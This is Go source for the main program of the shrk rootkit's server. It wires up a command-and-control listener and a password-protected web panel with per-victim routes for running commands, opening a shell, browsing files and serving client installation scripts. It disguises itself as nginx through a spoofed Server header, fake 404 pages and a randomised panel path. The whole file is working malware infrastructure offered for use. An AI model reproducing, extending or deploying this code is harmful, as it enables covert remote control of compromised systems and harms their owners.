package main

import (
	"fmt"
	"net/url"
	"os"
	"strings"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/template/django/v3"
	"github.com/ngn13/shrk/server/c2"
	"github.com/ngn13/shrk/server/config"
	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/joblist"
	"github.com/ngn13/shrk/server/log"
	"github.com/ngn13/shrk/server/routes"
	"github.com/ngn13/shrk/server/util"
)

/*

 * shrk/server | C2 and the web server for the shrk rootkit
 * written by ngn (https://ngn.tf) (2024)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

 */

func main() {
	var (
		conf *config.Type
		jobs *joblist.Type
		db   *database.Type
		c2s  *c2.Type
		app  *fiber.App
		err  error
	)

	// create the log functions
	if err = log.New(); err != nil {
		fmt.Printf("failed to create the logger: %s", err.Error())
		os.Exit(1)
	}

	// load config
	if conf, err = config.New(); err != nil {
		log.Fail("failed to load the configuration: %s", err.Error())
		os.Exit(1)
	}

	// generate a random source archive path
	conf.SourcePath = fmt.Sprintf("/%s", util.RandomStr(18))

	// check the password configuration
	if conf.Password == "" {
		conf.Password = util.RandomStr(13)
		log.Warn("no password specified, randomly generated one: %s", conf.Password)
	}

	// disable debug messages if they are not enabled
	if !conf.Debug {
		log.Debg = func(format string, v ...any) {}
	}

	// load data(base)
	if db, err = database.New(conf); err != nil {
		log.Fail("failed to load the database: %s", err.Error())
		os.Exit(1)
	}

	// load the jobs
	if jobs, err = joblist.New(); err != nil {
		log.Fail("failed to load the jobs: %s", err.Error())
		os.Exit(1)
	}

	// create the C2 server
	if c2s, err = c2.New(conf, db, jobs); err != nil {
		log.Fail("failed to create the C2 server: %s", err.Error())
		os.Exit(1)
	}

	// create the rendering engine
	if err = util.DirExists(conf.Views); err != nil {
		log.Fail("views directory (%s) is not available: %s", conf.Views, err.Error())
		os.Exit(1)
	}
	render := django.New(conf.Views, ".html")

	// create new fiber app
	app = fiber.New(fiber.Config{
		DisableStartupMessage: true,
		ServerHeader:          "",
		Views:                 render,
	})

	// setup local config
	app.Use("*", func(c *fiber.Ctx) error {
		c.Set("Server", "nginx")

		c.Locals("config", conf)
		c.Locals("database", db)
		c.Locals("joblist", jobs)
		c.Locals("c2", c2s)

		return c.Next()
	})

	if conf.Path == "" {
		conf.Path = fmt.Sprintf("/%s", util.RandomStr(20))
		log.Warn("you did not specify a path for the web interface, generating a random one")
	}

	if conf.Path[0] != '/' {
		log.Fail("web interface path (%s) should be an absolute path", conf.Path)
		os.Exit(1)
	}
	conf.Path = strings.TrimSuffix(conf.Path, "/")

	// setup web interface paths
	wi := app.Group(conf.Path)
	wi.Use("*", routes.VerifyAuth)
	wi.Get("/", routes.GET_index)
	wi.Get("/new", routes.GET_new)
	wi.Get("/logs", routes.GET_logs)
	wi.Get("/login", routes.GET_login)
	wi.Get("/logout", routes.GET_logout)

	wi.Post("/new", routes.POST_new)
	wi.Post("/login", routes.POST_login)

	ci := wi.Group("/c/:cid")
	ci.Use("*", routes.VerifyClient)

	ci.Get("/ps", routes.GET_ps)
	ci.Get("/do", routes.GET_do)
	ci.Get("/run", routes.GET_run)
	ci.Get("/shell", routes.GET_shell)
	ci.Get("/files", routes.GET_files)
	ci.Get("/remove", routes.GET_remove)
	ci.Get("/protect", routes.GET_protect)

	ci.Post("/run", routes.POST_run)
	ci.Post("/shell", routes.POST_shell)

	// setup the static route
	if err = util.DirExists(conf.Static); err != nil {
		log.Fail("static directory (%s) is not available: %s", conf.Static, err.Error())
		os.Exit(1)
	}
	wi.Static("/static", conf.Static)

	app.Get(conf.SourcePath, routes.GET_source) // route for the local source archive
	app.Get("/:script", routes.GET_script)      // route for obtaning client installation scripts

	// for all the other pages, send a fake nginx 404
	app.All("*", func(c *fiber.Ctx) error {
		return util.RenderNginxNotFound(c)
	})

	// start the C2 server
	log.Info("starting the C2 server on %s", conf.C2_Addr)

	if err = c2s.Listen(conf.C2_Addr); err != nil {
		log.Fail("failed to start the C2 server: %s", err.Error())
		os.Exit(1)
	}

	// start the fiber HTTP server
	wi_path, _ := url.JoinPath(conf.HTTP_URL, conf.Path)

	log.Info("starting the HTTP server on %s", conf.HTTP_Addr)
	log.Info("access the web interface on %s", wi_path)

	if err = app.Listen(conf.HTTP_Addr); err != nil {
		log.Fail("failed to start the HTTP server: %s", err.Error())
		os.Exit(1)
	}
}
